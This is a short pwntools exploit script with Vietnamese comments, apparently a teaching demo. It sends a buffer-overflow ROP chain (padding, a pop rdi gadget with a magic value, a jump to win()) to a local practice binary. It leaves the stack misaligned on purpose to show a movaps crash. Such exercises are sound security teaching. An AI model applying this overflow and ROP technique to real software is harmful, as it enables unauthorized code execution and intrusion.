#!/usr/bin/env python3
# Demo 3.3 (buoc 1): co tinh QUEN can stack de thay bay movaps.
# win() chay (in "[+] magic dung. Shell:") nhung system("/bin/sh") crash tai
# movaps trong do_system vi RSP lech 16. Script in ra phan thu duoc roi process chet.
from pwn import *

context.binary = elf = ELF('./callme', checksec=False)
context.log_level = 'info'

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

io = process('./callme')
io.recvuntil(b'Du lieu:\n')
io.send(flat(
    b'A' * 72,
    pop_rdi, 0xdeadbeefcafebabe,     # nap magic vao rdi
    elf.sym['win'],                   # nhay vao win (KHONG can stack)
))
io.sendline(b'id')
print(io.recvall(timeout=2).decode(errors='replace'))
